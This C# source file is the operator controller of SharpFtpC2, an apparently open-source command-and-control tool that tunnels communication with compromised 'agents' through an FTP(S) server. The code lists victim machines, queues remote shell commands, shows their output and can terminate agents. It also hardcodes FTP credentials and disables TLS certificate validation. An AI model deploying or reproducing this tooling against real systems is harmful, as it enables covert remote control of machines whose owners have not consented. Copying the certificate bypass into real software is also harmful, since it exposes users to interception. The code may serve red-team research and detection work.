/*
 * =========================================================================================
 * Project:       SharpFtpC2 - C2 (v1.0 Beta)
 * 
 * Description:   SharpFtpShell is a compact C# project that showcases the technique
 *                of tunneling Command and Control (C2) communication via FTP(S).
 * 
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

/*
 * 
 * TODO
 * =================
 * 
 * - Agent Authentication.
 * - Data Encryption.
 * - Do not require to enter the full GUID but starting unique part.
 * - Optimization.
 * - Comment and explain the code.
 * - More verbose in agent.
 * 
 */

using FtpAgent;
using FtpC2;
using FtpC2.Responses;
using System.Collections.Concurrent;
using Microsoft.Extensions.CommandLineUtils;
using System.Data;
using System.Text.RegularExpressions;
using System.Diagnostics;
using FtpC2.Tasks;
using System.Threading.Tasks;
using System.Collections;
using System.Text;
using System.Net;

class Program
{
    // EDIT HERE BEGIN ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    public static readonly string FtpHost = "127.0.0.1";
    public static readonly string FtpUser = "dark";
    public static readonly string FtpPwd = "toor";
    public static readonly bool FtpSecure = true;    

    public static readonly int SynchronizeDelay = 1000;
    // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    public static CancellationTokenSource CancellationTokenSource = new();

    private static ConcurrentDictionary<Guid /* AgentId */, Agent> Agents = new();
    private static ConcurrentDictionary<Guid /* TaskId */, ResponseWrapper> TaskResponses = new();

    // ConcurrentBag is not suitable in my scenario so I'm using a classic List with locking mechanisms
    private static object TaskRequestsLock = new();
    private static List<TaskWrapper> TaskRequests = new();

    private static Guid ActiveAgent = Guid.Empty;    

    private static void RegisterNewTask(TaskWrapper taskRequest, Guid agentId)
    {
        taskRequest.Id = Guid.NewGuid();
        taskRequest.TaskType = taskRequest.GetType().Name;
        taskRequest.AgentId = agentId;

        lock (TaskRequestsLock)
            TaskRequests.Add(taskRequest);
    }

    private static void RegisterNewCommandTask(TaskCommand.CommandKind command, Guid agentId)
    {
        TaskCommand taskCommand = new();
        taskCommand.Command = command;

        ///
        RegisterNewTask(taskCommand, agentId);
    }

    public static void ShowResult(ResponseWrapper response)
    {
        switch (response)
        {
            case ResponseShellCommand responseShellCommand:
                {
                    UX.ColorBackTicks($"Command: `{responseShellCommand.Command}`");                   

                    if (responseShellCommand.Stdout?.Length > 0)
                        Console.WriteLine(Encoding.UTF8.GetString(responseShellCommand.Stdout)); 

                    if (responseShellCommand.Stderr?.Length > 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;

                        Console.WriteLine(Encoding.UTF8.GetString(responseShellCommand.Stderr));

                        Console.ResetColor();
                    }

                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("EOF");
                    Console.ResetColor();

                    break;
                }

            default:
                {
                    UX.DisplayWarning($"`{response.GetType().Name}` result is not implemented or necessary.");

                    break;
                }
        }
    }

    private static void ControllerPrompt()
    {
        CommandLineApplication parser = new();

        parser.Command("help", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Show available commands.";

            cmd.OnExecute(() =>
            {
                Console.WriteLine(parser.GetHelpText());

                return 0;
            });
        });

        parser.Command("clear", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Clear console.";

            cmd.OnExecute(() =>
            {
                Console.Clear();

                return 0;
            });
        });

        parser.Command("exit", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Exit controller (Donnie Darko).";

            cmd.OnExecute(() =>
            {
                throw new ExitProgramExceptions();

                return 0;
            });
        });

        parser.Command("agents", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Show active agents.";

            cmd.OnExecute(() =>
            {
                if (Agents.Count == 0)
                {
                    UX.DisplayInfo("No agent so far.");

                    return 0;
                }

                DataTable table = new();

                table.Columns.Add("Id");
                table.Columns.Add("User@Computer");
                table.Columns.Add("Domain");
                table.Columns.Add("Process Id");                                
                table.Columns.Add("Is64Bit");

                table.Columns.Add("Last Seen");

                List<KeyValuePair<Guid, Agent>> agentPairs = Agents.ToList();

                agentPairs.Sort((pair2, pair1) => pair1.Value.DateTime.CompareTo(pair2.Value.DateTime));

                foreach (KeyValuePair<Guid, Agent> agentPair in agentPairs)
                {
                    Agent agent = agentPair.Value;
                    ///

                    DataRow row = table.NewRow();

                    row[0] = agentPair.Key;
                    row[1] = agentPair.Value.DisplayName();
                    row[2] = agent.Domain;
                    row[3] = agent.ProcessId;                                        
                    row[4] = agent.Is64BitProcess.ToString();
                    row[5] = (int)(DateTime.Now - agent.DateTime).TotalSeconds;

                    table.Rows.Add(row);
                }

                UX.DisplayTableToConsole(table);

                ///
                return 0;
            });
        });

        parser.Command("use", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Interact with a registered agent.";

            var arg = cmd.Argument("id", "Agent Id");

            cmd.OnExecute(() =>
            {
                if (Guid.TryParse(arg.Value, out Guid agentId))
                {
                    if (Agents.ContainsKey(agentId))
                        ActiveAgent = agentId;                    
                    else
                        throw new IndexOutOfRangeException($"Agent Id(`{agentId}`) not found.");
                }
                else
                    throw new FormatException($"'{arg.Value}' is not a valid GUID.");

                ///
                return 0;
            });
        });

        UX.DisplayControllerPrompt();

        string? action = Console.ReadLine();

        Console.WriteLine();

        if (string.IsNullOrEmpty(action))
            return;

        parser.Execute(action.Split(" "));

        Console.WriteLine();
    }

    private static void AgentPrompt()
    {
        if (ActiveAgent == Guid.Empty)
            return;        

        if (!Agents.TryGetValue(ActiveAgent, out Agent? agent))
        {
            ActiveAgent = Guid.Empty;
            return;
        }

        CommandLineApplication parser = new();

        parser.Command("help", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Show available commands.";

            cmd.OnExecute(() =>
            {
                Console.WriteLine(parser.GetHelpText());

                return 0;
            });
        });

        parser.Command("wait", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");

            var argument = cmd.Option("-s|--seconds", "Seconds to wait", CommandOptionType.SingleValue);

            cmd.Description = "Makes main thread hanging for a defined amount of seconds (default: 1).";

            cmd.OnExecute(() =>
            {
                int seconds = 1;
                if (argument.HasValue())
                {
                    Utilities.CheckIntegerArgument(argument);

                    int.TryParse(argument.Value(), out seconds);
                }

                Thread.Sleep(seconds * 1000);

                ///
                return 0;
            });
        });

        parser.Command("clear", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Clear console.";

            cmd.OnExecute(() =>
            {
                Console.Clear();

                return 0;
            });
        });

        parser.Command("exit", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Exit current agent context.";

            cmd.OnExecute(() =>
            {
                ActiveAgent = Guid.Empty;

                return 0;
            });
        });

        parser.Command("results", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Display remote agent tasks responses.";

            cmd.OnExecute(() =>
            {                
                List<Guid> responses = new();
                foreach(KeyValuePair<Guid, ResponseWrapper> entry in TaskResponses)
                {
                    if (entry.Value.AgentId == ActiveAgent)
                        responses.Add(entry.Key);
                }

                if (responses.Count == 0)
                {
                    UX.DisplayInfo("No result so far.");

                    return 0;
                }

                DataTable table = new();

                table.Columns.Add("#");
                table.Columns.Add("Kind");
                table.Columns.Add("Display Name");
                table.Columns.Add("When");
                
                foreach (KeyValuePair<Guid, ResponseWrapper> entry in 
                    TaskResponses.Where(x => responses.Contains(x.Key)).OrderBy(x => x.Value.DateTime)
                )
                {
                    DataRow row = table.NewRow();

                    row[0] = entry.Key;
                    row[1] = entry.Value.GetType().Name;
                    row[2] = entry.Value.DisplayName();
                    row[3] = Utilities.TimeSince(entry.Value.DateTime);

                    table.Rows.Add(row);
                }
                
                UX.DisplayTableToConsole(table);                

                return 0;                
            });

            parser.Command("results::show", cmd =>
            {
                cmd.HelpOption("-?|-h|--help");
                cmd.Description = "Display a task response content by its id.";

                var arg = cmd.Argument("id", "Task response identifier");

                cmd.OnExecute(() =>
                {
                    if (Guid.TryParse(arg.Value, out Guid responseId))
                    {
                        if (TaskResponses.TryGetValue(responseId, out ResponseWrapper? value))
                            ShowResult(value);
                        else
                            throw new IndexOutOfRangeException($"Response Id(`{responseId}`) not found.");
                    }
                    else
                        throw new FormatException($"'{arg.Value}' is not a valid GUID.");                    

                    ///
                    return 0;
                });
            });

            parser.Command("exec", cmd =>
            {
                cmd.HelpOption("-?|-h|--help");
                cmd.Description = "Run a shell command.";

                var args = cmd.Argument("command", "Shell command", true);

                cmd.OnExecute(() =>
                {
                    if (args.Values.Count == 0)
                        return 1;

                    TaskShellCommand task = new();
                    task.Command = string.Join(" ", args.Values);

                    RegisterNewTask(task, ActiveAgent);

                    return 0;
                });
            });

            parser.Command("kill", cmd =>
            {
                cmd.HelpOption("-?|-h|--help");
                cmd.Description = "Terminate remote agent process.";

                cmd.OnExecute(() =>
                {
                    RegisterNewCommandTask(TaskCommand.CommandKind.TerminateAgent, ActiveAgent);                    

                    return 0;
                });
            });
        });

        UX.DisplayAgentPrompt(agent);

        string? actions = Console.ReadLine();

        Console.WriteLine();

        if (string.IsNullOrEmpty(actions))
            return;

        foreach (string action in Utilities.SplitEx(actions))
            parser.Execute(action.Split(" "));

        Console.WriteLine();
    }

    public static void Main(string[] args)
    {
        // Important Notice: The delegate below renders the current application susceptible to
        // Man-in-the-Middle (MITM) attacks when utilizing SSL/TLS features.
        // This configuration was implemented to accommodate self-signed certificates.
        // However, it is strongly advised not to employ this approach in a production environment
        // if SSL/TLS security is expected.
        if (FtpSecure)
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ///

        UX.DisplayBanner();
        ///

        List<Thread> daemons = new();

        // This thread is tasked with periodically gathering information about active and inactive agents.        
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd);

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Refresh Agents Informations
                    c2Protocol.RefreshAgents(Agents);


                    ///
                    Thread.Sleep(SynchronizeDelay);
                }
                catch (Exception ex)
                {
                    UX.DisplayError($"@DaemonProbeThread: {ex.Message}");
                };
            }
        }));


        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd);

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Synchronize Task Responses
                    c2Protocol.EnumerateResponses(TaskResponses);

                    // Register New Task Requests
                    lock (TaskRequestsLock)
                    {
                        foreach (TaskWrapper taskRequest in TaskRequests)
                        {
                            c2Protocol.RegisterNewTask(taskRequest);
                        }
                        TaskRequests.Clear();
                    }
                    
                    ///
                    Thread.Sleep(SynchronizeDelay);
                }
                catch (Exception ex)
                {
                    UX.DisplayError($"@DaemonSynchronizeThread: {ex.Message}");
                };
            }
        }));

        // The action to handle a CTRL+C signal on the console has been registered.
        // When triggered, it will instruct any associated cancellation tokens to properly
        // shut down their associated daemons.
        Console.CancelKeyPress += (sender, cancelEventArgs) =>
        {
            CancellationTokenSource.Cancel(); // Signal tokens that application needs to be closed.

            cancelEventArgs.Cancel = true; // Cancel default behaviour
        };

        // Start daemons
        foreach (Thread daemon in daemons)
            daemon.Start(CancellationTokenSource.Token);

        CancellationToken token = CancellationTokenSource.Token;
        while (!token.IsCancellationRequested)
        {
            try
            {
                if (ActiveAgent == Guid.Empty)
                    ControllerPrompt();
                else
                    AgentPrompt();

                // Dirty method to force messages to process during an IDLE time.
                Thread.Sleep(50);

            }
            catch (ExitProgramExceptions)
            {
                CancellationTokenSource.Cancel();

                break;
            }
            catch (Exception e)
            {
                UX.DisplayError(e.Message);

                Console.WriteLine();
            }
        }

        // Wait for daemons to join main thread
        foreach (Thread daemon in daemons)
            daemon.Join();
    }
}